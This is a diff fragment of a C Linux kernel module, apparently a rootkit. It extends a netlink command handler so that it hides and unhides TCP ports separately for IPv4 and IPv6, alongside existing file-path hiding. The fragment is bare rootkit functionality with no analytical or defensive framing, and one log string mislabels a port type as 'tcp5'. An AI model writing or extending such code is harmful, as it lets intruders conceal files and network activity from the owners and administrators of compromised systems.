@@ -37,20 +37,36 @@ void my_recv_msg(struct sk_buff *skb) {
             remove_hidden_path(msg.data);
             printk(KERN_INFO
             "remove hidden path: %s\n", msg.data);
+            break
+            ;
+        }
+        case OPER_ADD_HIDDEN_TCP4_PORT: {
+            PORT port = *((PORT*) msg.data);
+            add_hidden_tcp4_port(port);
+            printk(KERN_INFO
+            "add hidden tcp4 port: %d\n", port);
             break;
         }
-        case OPER_ADD_HIDDEN_TCP_PORT: {
+        case OPER_REMOVE_HIDDEN_TCP4_PORT: {
             PORT port = *((PORT*) msg.data);
-            add_hidden_tcp_port(port);
+            remove_hidden_tcp4_port(port);
             printk(KERN_INFO
-            "add hidden port: %d\n", port);
+            "remove hidden tcp5 port: %d\n", port);
             break;
         }
-        case OPER_REMOVE_HIDDEN_TCP_PORT: {
+
+        case OPER_ADD_HIDDEN_TCP6_PORT: {
             PORT port = *((PORT*) msg.data);
-            remove_hidden_tcp_port(port);
+            add_hidden_tcp6_port(port);
             printk(KERN_INFO
-            "remove hidden port: %d\n", port);
+            "add hidden tcp6 port: %d\n", port);
+            break;
+        }
+        case OPER_REMOVE_HIDDEN_TCP6_PORT: {
+            PORT port = *((PORT*) msg.data);
+            remove_hidden_tcp6_port(port);
+            printk(KERN_INFO
+            "remove hidden tcp6 port: %d\n", port);
             break;
         }
     }
